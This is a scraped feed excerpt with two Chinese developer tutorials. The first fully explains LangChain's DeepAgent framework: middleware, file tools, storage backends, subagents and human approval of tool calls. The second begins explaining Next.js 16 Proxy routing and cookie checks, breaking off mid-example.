hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>当我们谈论 AI Agent 时，大多数开发者想到的是一个简单的工具调用循环：LLM 生成工具调用，执行工具，将结果返回给 LLM，继续下一轮。这种浅层架构在处理简单任务时表现良好，但面对复杂的多步骤工作流时，就会暴露出致命缺陷：无法有效规划、上下文管理混乱、缺乏质量审查机制。尽管有类似与<code>Langgraph</code>这样的工作流框架，能够免去开发者在编排workflow上面的耗时，但是Agent的核心能力，比如节点和工具，仍需要自行实现。</p>
<p>LangChain 团队研究了<code>Claude Code</code>、<code>OpenAI Deep Research</code>、<code>Manus</code>等真正在生产环境中解决复杂问题的系统，提炼出了四个关键的特征：</p>
<ol>
<li>
<p><strong>详细的系统提示词</strong>：包含工具使用指南和少样本示例的长提示。</p>
</li>
<li>
<p><strong>规划工具</strong>：如<code>Claude Code</code>的Todo List，用于任务分解和进度追踪。</p>
</li>
<li>
<p><strong>子智能体委托</strong>：将复杂任务拆分给专注的子智能体处理。</p>
</li>
<li>
<p><strong>文件系统访问</strong>：作为共享工作空间和长期记忆的载体。</p>
</li>
</ol>
<p><code>DeepAgent</code>正是将这些特征进行抽象后，系统化、框架化的产物，它不是简单的工具调用循环，而是一个完整的<code>Agent Harness</code>，即智能体工具套件。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3bf01a98ee241d08756ae458928fabb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex5bqm5a2m5Lmg5py65Zmo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764464104&amp;x-signature=95mZ5Rb5fAcSdoc0GK5RyHGXL88%3D" alt="DeepAgent核心架构" loading="lazy"/></p>
<h2 data-id="heading-0">核心架构</h2>
<h3 data-id="heading-1">什么是 Agent Harness</h3>
<p><code>DeepAgent</code>将自己定位为<code>Agent Harness</code>，它本质上仍是工具调用循环，但集成了让智能体<strong>深度思考</strong>的核心能力。与传统框架不同，<code>DeepAgent</code>通过内置工具和能力，让开发者专注于业务逻辑，而非基础设施搭建。</p>
<h3 data-id="heading-2">模块化的中间件</h3>
<p><code>DeepAgent</code>采用可组合的中间件架构，每个中间件负责一个独立的能力域。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/beb6dd52c2fe4ed2ae8fe0f26bba9bc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex5bqm5a2m5Lmg5py65Zmo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764464104&amp;x-signature=aCqRVfxjsHWgcaAB6Cq%2BNtMeu%2F8%3D" alt="内置的中间件" loading="lazy"/></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> deepagents <span class="hljs-keyword">import</span> create_deep_agent
<span class="hljs-keyword">from</span> deepagents.middleware <span class="hljs-keyword">import</span> TodoListMiddleware, FilesystemMiddleware, SubAgentMiddleware

<span class="hljs-comment"># 默认情况下，create_deep_agent 会自动附加三大核心中间件</span>
agent = create_deep_agent(
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    <span class="hljs-comment"># 以下中间件会自动启用：</span>
    <span class="hljs-comment"># - TodoListMiddleware: 提供 write_todos 规划工具</span>
    <span class="hljs-comment"># - FilesystemMiddleware: 提供 6 个文件系统工具</span>
    <span class="hljs-comment"># - SubAgentMiddleware: 提供 task 工具用于子智能体委托</span>
)
</code></pre>
<p>这种设计的优势在于可组合性，让开发者可以根据需求选择启用特定中间件，或添加自定义中间件扩展能力。</p>
<h2 data-id="heading-3">文件系统</h2>
<h3 data-id="heading-4">六大文件系统工具</h3>
<p><code>DeepAgent</code>提供了完整的文件系统操作能力，这是其区别于浅层 Agent 的关键特性：</p>








































<table><thead><tr><th>工具</th><th>功能</th><th>用途</th></tr></thead><tbody><tr><td><code>ls</code></td><td>列出文件及元数据，包括大小和修改时间等</td><td>探索目录结构</td></tr><tr><td><code>read_file</code></td><td>读取文件内容，支持行号和分页</td><td>分块读取大文件</td></tr><tr><td><code>write_file</code></td><td>创建新文件</td><td>保存中间结果</td></tr><tr><td><code>edit_file</code></td><td>精确字符串替换</td><td>更新已有文件</td></tr><tr><td><code>glob</code></td><td>模式匹配查找文件</td><td>批量查找文件</td></tr><tr><td><code>grep</code></td><td>搜索文件内容</td><td>代码搜索，内容定位</td></tr></tbody></table>
<h3 data-id="heading-5">自动压缩机制</h3>
<p>当工具返回结果超出token阈值时，<code>DeepAgent</code>会自动将其转储到文件系统，防止上下文窗口饱和：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 伪代码示例：自动驱逐逻辑</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_tool_result</span>(<span class="hljs-params">result, threshold=<span class="hljs-number">2000</span></span>):
    <span class="hljs-keyword">if</span> count_tokens(result) &gt; threshold:
        file_path = <span class="hljs-string">f"/temp/tool_result_<span class="hljs-subst">{uuid4()}</span>.txt"</span>
        write_file(file_path, result)
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"Large result saved to <span class="hljs-subst">{file_path}</span>. Use read_file to access."</span>
    <span class="hljs-keyword">return</span> result
</code></pre>
<p>这确保了即使调用返回海量数据的工具（如Web 搜索、数据库查询等），智能体也能通过文件系统分块读取，而不会导致上下文崩溃。</p>
<h2 data-id="heading-6">灵活的持久化策略</h2>
<h3 data-id="heading-7">BackendProtocol 协议设计</h3>
<p><code>DeepAgent</code>将文件系统操作抽象为<code>BackendProtocol</code>协议，支持多种存储策略：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> deepagents.backends <span class="hljs-keyword">import</span> StateBackend, FilesystemBackend, StoreBackend, CompositeBackend

<span class="hljs-comment"># 1. StateBackend：短期内存（默认）</span>
agent = create_deep_agent()  <span class="hljs-comment"># 文件存储在 LangGraph State 中</span>

<span class="hljs-comment"># 2. FilesystemBackend：本地磁盘持久化</span>
agent = create_deep_agent(
    backend=FilesystemBackend(root_dir=<span class="hljs-string">"/Users/agent/workspace"</span>, virtual_mode=<span class="hljs-literal">True</span>)
)

<span class="hljs-comment"># 3. StoreBackend：跨线程持久化（LangGraph Store）</span>
<span class="hljs-keyword">from</span> langgraph.store.memory <span class="hljs-keyword">import</span> InMemoryStore
agent = create_deep_agent(
    backend=<span class="hljs-keyword">lambda</span> rt: StoreBackend(rt),
    store=InMemoryStore()
)

<span class="hljs-comment"># 4. CompositeBackend：混合存储路由</span>
composite = <span class="hljs-keyword">lambda</span> rt: CompositeBackend(
    default=StateBackend(rt),  <span class="hljs-comment"># 临时文件用 State</span>
    routes={
        <span class="hljs-string">"/memories/"</span>: StoreBackend(rt),  <span class="hljs-comment"># 长期记忆持久化</span>
        <span class="hljs-string">"/workspace/"</span>: FilesystemBackend(root_dir=<span class="hljs-string">"/real/path"</span>)  <span class="hljs-comment"># 工作文件映射到磁盘</span>
    }
)
agent = create_deep_agent(backend=composite, store=InMemoryStore())
</code></pre>
<h3 data-id="heading-8">路由策略示例</h3>
<p>使用<code>CompositeBackend</code>时，不同路径前缀的文件会路由到不同的后端：</p>
<ul>
<li>
<p><code>/workspace/plan.md</code> → StateBackend（短期）</p>
</li>
<li>
<p><code>/memories/agent_context.txt</code> → StoreBackend（跨会话持久化）</p>
</li>
<li>
<p><code>/docs/api_spec.yaml</code> → FilesystemBackend（真实文件系统）</p>
</li>
</ul>
<p>这种设计让智能体能够同时管理临时草稿和长期知识库。</p>
<h2 data-id="heading-9">子智能体机制</h2>
<h3 data-id="heading-10">为什么需要子智能体</h3>
<p>子智能体解决了上下文膨胀问题，实现任务委托与上下文隔离。当智能体使用大输出工具（如多次 Web 搜索）时，主智能体的上下文会迅速填满中间结果。子智能体通过隔离详细工作，让主智能体只接收最终结果，而非生成该结果的几十次工具调用。</p>
<h3 data-id="heading-11">两种定义方式</h3>
<ol>
<li>字典配置</li>
</ol>
<pre><code class="hljs language-python" lang="python">research_subagent = {
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"research-agent"</span>,
    <span class="hljs-string">"description"</span>: <span class="hljs-string">"用于深度研究复杂问题"</span>,
    <span class="hljs-string">"system_prompt"</span>: <span class="hljs-string">"你是一个专业的研究助手，擅长多步骤信息收集和综合"</span>,
    <span class="hljs-string">"tools"</span>: [internet_search, summarize],
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"openai:gpt-4o"</span>,  <span class="hljs-comment"># 可选：覆盖主智能体模型</span>
    <span class="hljs-string">"interrupt_on"</span>: {<span class="hljs-string">"internet_search"</span>: <span class="hljs-literal">True</span>}  <span class="hljs-comment"># 可选：HITL 配置</span>
}

agent = create_deep_agent(
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    subagents=[research_subagent]
)
</code></pre>
<ol start="2">
<li>编译图</li>
</ol>
<p>对于复杂工作流，可以使用预构建的<code>LangGraph</code>图：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> deepagents <span class="hljs-keyword">import</span> CompiledSubAgent
<span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph

<span class="hljs-comment"># 创建自定义图</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_analysis_graph</span>():
    workflow = StateGraph(...)
    <span class="hljs-comment"># ... 构建复杂的分析流程</span>
    <span class="hljs-keyword">return</span> workflow.<span class="hljs-built_in">compile</span>()

analysis_subagent = CompiledSubAgent(
    name=<span class="hljs-string">"data-analyzer"</span>,
    description=<span class="hljs-string">"执行多步骤数据分析任务"</span>,
    runnable=create_analysis_graph()
)

agent = create_deep_agent(subagents=[analysis_subagent])
</code></pre>
<h3 data-id="heading-12">默认子智能体</h3>
<p>除了用户定义的子智能体，<code>DeepAgent</code>始终提供一个<code>general-purpose</code>子智能体：</p>
<ul>
<li>
<p>与主智能体相同的系统提示词和工具</p>
</li>
<li>
<p>主要用途：上下文隔离（而非专业化）</p>
</li>
<li>
<p>使用场景：主智能体可以将复杂任务委托给它，获得简洁结果而不受中间过程污染</p>
</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 主智能体可以这样使用：</span>
<span class="hljs-comment"># "请使用 general-purpose 子智能体分析这 100 个文件，返回摘要"</span>
<span class="hljs-comment"># 子智能体完成工作后，主智能体只收到摘要，而非 100 次文件读取的详细内容</span>
</code></pre>
<h2 data-id="heading-13">生产级特性</h2>
<p>针对生产环境，<code>DeepAgent</code>还提供了许多有用的特性。</p>
<h3 data-id="heading-14">1. 对话历史自动摘要</h3>
<p>当 token 使用量过高时，<code>DeepAgent</code>会自动压缩旧对话历史：</p>
<pre><code class="hljs language-python" lang="python">agent = create_deep_agent(
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    <span class="hljs-comment"># 配置摘要触发阈值和目标长度</span>
)
</code></pre>
<h3 data-id="heading-15">2. 工具调用自动修复</h3>
<p>当工具调用被中断或取消时，<code>DeepAgent</code>会自动修复消息历史：</p>
<p><strong>问题场景</strong>：用户在工具执行过程中取消操作，导致<code>tool_call</code>消息没有对应的<code>tool_result</code>，破坏了消息序列的完整性。</p>
<p><strong>解决方案</strong>：<code>DeepAgent</code>会自动注入占位符<code>ToolMessage</code>，确保消息历史的连贯性，避免 LLM 在后续轮次中因不完整的上下文而产生困惑。</p>
<h3 data-id="heading-16">3. Prompt缓存机制</h3>
<p>对于使用Anthropic模型的智能体，<code>DeepAgent</code>启用了<code>prompt caching</code>功能：</p>
<ul>
<li>
<p>自动标记可缓存的提示词部分（如系统提示词、工具定义）</p>
</li>
<li>
<p>减少重复 token 处理，显著降低成本和延迟</p>
</li>
<li>
<p>对于长系统提示词的深度智能体尤其有价值</p>
</li>
</ul>
<h3 data-id="heading-17">4. Human-in-the-Loop</h3>
<p><code>DeepAgent</code>支持在特定工具调用时暂停执行，等待人工审批：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> MemorySaver

agent = create_deep_agent(
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    tools=[delete_file, send_email, read_file],
    interrupt_on={
        <span class="hljs-string">"delete_file"</span>: <span class="hljs-literal">True</span>,  <span class="hljs-comment"># 需要审批（approve/edit/reject）</span>
        <span class="hljs-string">"send_email"</span>: {<span class="hljs-string">"allowed_decisions"</span>: [<span class="hljs-string">"approve"</span>, <span class="hljs-string">"reject"</span>]},  <span class="hljs-comment"># 只能批准或拒绝</span>
        <span class="hljs-string">"read_file"</span>: <span class="hljs-literal">False</span>  <span class="hljs-comment"># 无需审批</span>
    },
    checkpointer=MemorySaver()  <span class="hljs-comment"># HITL 必须使用 checkpointer</span>
)

<span class="hljs-comment"># 使用示例</span>
config = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"session-123"</span>}}
result = agent.invoke({<span class="hljs-string">"messages"</span>: [...]}, config=config)

<span class="hljs-keyword">if</span> result.get(<span class="hljs-string">"__interrupt__"</span>):
    <span class="hljs-comment"># 处理中断，展示待审批操作</span>
    interrupts = result[<span class="hljs-string">"__interrupt__"</span>][<span class="hljs-number">0</span>].value
    action_requests = interrupts[<span class="hljs-string">"action_requests"</span>]
    
    <span class="hljs-comment"># 用户决策</span>
    decisions = [{<span class="hljs-string">"type"</span>: <span class="hljs-string">"approve"</span>}]  <span class="hljs-comment"># 或 "edit"、"reject"</span>
    
    <span class="hljs-comment"># 恢复执行</span>
    result = agent.invoke(
        Command(resume={<span class="hljs-string">"decisions"</span>: decisions}),
        config=config  <span class="hljs-comment"># 必须使用相同的 config</span>
    )
</code></pre>
<h2 data-id="heading-18">总结</h2>
<p><code>DeepAgent</code>实现了从浅层Agent到深度Agent的范式转变，其核心价值在于将复杂任务自动化系统所需的核心能力封装为可组合、生产就绪的<strong>模块化中间件</strong>。</p>
<p>有了这些生产特性，无论是在构建研究助手、代码生成工具、数据分析平台还是智能客服系统，<code>DeepAgent</code>的设计模式都值得深入学习和应用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.js第十章(Proxy)]]></title>    <link>https://juejin.cn/post/7575458028254822443</link>    <guid>https://juejin.cn/post/7575458028254822443</guid>    <pubDate>2025-11-23T13:00:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575458028254822443" data-draft-id="7575442779039334442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.js第十章(Proxy)"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T13:00:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小满zs"/> <meta itemprop="url" content="https://juejin.cn/user/2463384809252397"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.js第十章(Proxy)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2463384809252397/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小满zs
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T13:00:39.000Z" title="Sun Nov 23 2025 13:00:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Proxy代理</h2>
<blockquote>
<p>从 Next.js 16 开始，中间件<code>Middleware</code>更名为代理<code>（Proxy）</code>，以更好地体现其用途。其功能保持不变</p>
</blockquote>
<p>如果你想升级为16.x版本，Next.js提供了命令行工具来帮助你升级，只需要执行以下命令即可：</p>
<pre><code class="hljs language-bash" lang="bash">npx @next/codemod@canary middleware-to-proxy .
</code></pre>
<p>代码转换会将文件和函数名从middleware重命名为proxy。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// middleware.ts -&gt; proxy.ts</span>
 
- <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"/>) {
+ <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params"/>) {
</code></pre>
<h3 data-id="heading-1">基本使用</h3>
<p>应用场景：</p>
<ul>
<li>处理跨域请求</li>
<li>接口转发例如/api/user -&gt; (可能是其他服务器java/go/python等) -&gt; /api/user</li>
<li>限流例如配合第三方服务做限流</li>
<li>鉴权/判断是否登录</li>
</ul>
<p>Prxoy代理其实跟拦截器类似，它可以在请求完成之前进行拦截，然后进行一些处理，例如：修改请求头、修改请求体、修改响应体等。</p>
<p>src/proxy.ts</p>
<p>定义proxy函数导出即可，Next.js会自动调用这个函数。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params">request: NextRequest</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(request.<span class="hljs-property">url</span>,<span class="hljs-string">'url'</span>);
}
</code></pre>
<p>但是你会发现，他会拦截项目中所有的请求，包括静态资源、API请求、页面请求等。</p>
<pre><code class="hljs language-txt" lang="txt">http://localhost:3000/.well-known/appspecific/com.chrome.devtools.json url
http://localhost:3000/_next/static/chunks/src_app_globals_91e4631d.css url
http://localhost:3000/_next/static/chunks/%5Bturbopack%5D_browser_dev_hmr-client_hmr-client_ts_cedd0592._.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_compiled_react-dom_1e674e59._.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_compiled_react-server-dom-turbopack_9212ccad._.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_compiled_next-devtools_index_1dd7fb59.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_compiled_a0e4c7b4._.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_client_a38d7d69._.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_4b2403f5._.js url
http://localhost:3000/_next/static/chunks/src_app_globals_91e4631d.css.map url
http://localhost:3000/_next/static/chunks/node_modules_%40swc_helpers_cjs_d80fb378._.js url
http://localhost:3000/_next/static/chunks/_a0ff3932._.js url
http://localhost:3000/api/login url
</code></pre>
<h4 data-id="heading-2">配置(config)</h4>
<p>例如我们只想匹配<code>'/api'</code>下面的路径去做一些事情，我们可以使用<code>config</code>配置来实现。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params">request: NextRequest</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(request.<span class="hljs-property">url</span>,<span class="hljs-string">'url'</span>);
}
<span class="hljs-comment">//配置匹配路径</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = {
    <span class="hljs-attr">matcher</span>: <span class="hljs-string">'/api/:path*'</span>,
    <span class="hljs-comment">//matcher: ['/api/:path*','/api/user/:path*'], 支持单个以及多个路径匹配</span>
    <span class="hljs-comment">//matcher: ['/((?!api|_next/static|_next/image|.*\\.png$).*)'], 同样支持正则表达式匹配</span>
}
</code></pre>
<p>结合之前的案例,在cookie那一集，我们还需要单独定义check接口检查cookie，现在我们可以直接在proxy中实现。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params">request: NextRequest</span>) {
    <span class="hljs-keyword">const</span> cookie = request.<span class="hljs-property">cookies</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'token'</span>);
    <span class="hljs-keyword">if</span> (request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/home'</span>) &amp;&amp; !cookie) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'redirect to login'</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'/'</span>, request.<span class="hljs-property">url</span>));
    }
